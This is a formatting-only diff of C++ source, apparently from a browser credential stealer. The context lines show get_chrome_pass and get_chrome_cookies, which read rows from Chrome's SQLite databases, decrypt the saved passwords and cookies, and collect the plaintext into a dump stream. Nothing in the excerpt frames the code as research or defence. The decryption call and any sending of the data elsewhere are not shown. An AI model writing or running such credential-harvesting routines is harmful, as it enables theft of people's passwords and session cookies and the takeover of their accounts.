@@ -10,18 +10,18 @@ stringstream get_chrome_pass(sqlite3* db)
     sqlite3_stmt *pStmt;
     int rc;
     rc=sqlite3_prepare(db, sql.c_str(), -1, &pStmt, 0);
-    if (rc != SQLITE_OK)
+    if (rc!=SQLITE_OK)
     {
-        dump << "statement failed rc=" << rc;
+        dump<<"statement failed rc="<<rc<<endl;
         return dump;
     }
 
     rc=sqlite3_step(pStmt);
-    //cout << "RC: " << rc << endl;
-    while(rc == SQLITE_ROW)
+    //cout<<"RC: "<<rc<<endl;
+    while(rc==SQLITE_ROW)
     {
-        dump << sqlite3_column_text(pStmt, 0) << endl;
-        dump << (char *)sqlite3_column_text(pStmt, 1) << endl;
+        dump<<sqlite3_column_text(pStmt, 0)<<endl;
+        dump<<(char *)sqlite3_column_text(pStmt, 1)<<endl;
 
         DATA_BLOB encryptedPass, decryptedPass;
 
@@ -41,11 +41,11 @@ stringstream get_chrome_pass(sqlite3* db)
         char *password=(char *)decryptedPass.pbData;
         while(isprint(*password))
         {
-            dump << *password;
+            dump<<*password;
             password++;
         }
 
-        dump << endl;
+        dump<<endl;
         free(encryptedPass.pbData);
         rc=sqlite3_step(pStmt);
     }
@@ -62,19 +62,19 @@ stringstream get_chrome_cookies(sqlite3* db)
     sqlite3_stmt *pStmt;
     int rc;
     rc=sqlite3_prepare(db, sql.c_str(), -1, &pStmt, 0);
-    if (rc != SQLITE_OK)
+    if (rc!=SQLITE_OK)
     {
-        dump << "statement failed rc=" << rc;
+        dump<<"statement failed rc="<<rc<<endl;
         return dump;
     }
-    cout << endl;
+    cout<<endl;
 
     rc=sqlite3_step(pStmt);
-    //cout << "RC: " << rc << endl;
-    while(rc == SQLITE_ROW)
+    //cout<<"RC: "<<rc<<endl;
+    while(rc==SQLITE_ROW)
     {
-        dump << sqlite3_column_text(pStmt, 0) << " ";
-        dump << (char *)sqlite3_column_text(pStmt, 1) << " ";
+        dump<<sqlite3_column_text(pStmt, 0)<<" ";
+        dump<<(char *)sqlite3_column_text(pStmt, 1)<<" ";
 
         DATA_BLOB encryptedCookies, decryptedCookies;
 
@@ -95,13 +95,13 @@ stringstream get_chrome_cookies(sqlite3* db)
         int i=0;
         while(decryptedCookies.pbData[i])
         {
-            //dump << *cookies;
-            dump << decryptedCookies.pbData[i];
+            //dump<<*cookies;
+            dump<<decryptedCookies.pbData[i];
             i++;
             //cookies++;
         }
 
-        dump << endl;
+        dump<<endl;
         free(encryptedCookies.pbData);
         rc=sqlite3_step(pStmt);
     }
@@ -115,9 +115,9 @@ int callback(void *NotUsed, int argc, char **argv, char **azColName)
 {
     for(int i=0; i < argc; i++)
     {
-        cout << azColName[i] << ": " << argv[i] << endl;
+        cout<<azColName[i]<<": "<<argv[i]<<endl;
     }
-    cout << endl;
+    cout<<endl;
     return 0;
 }
 
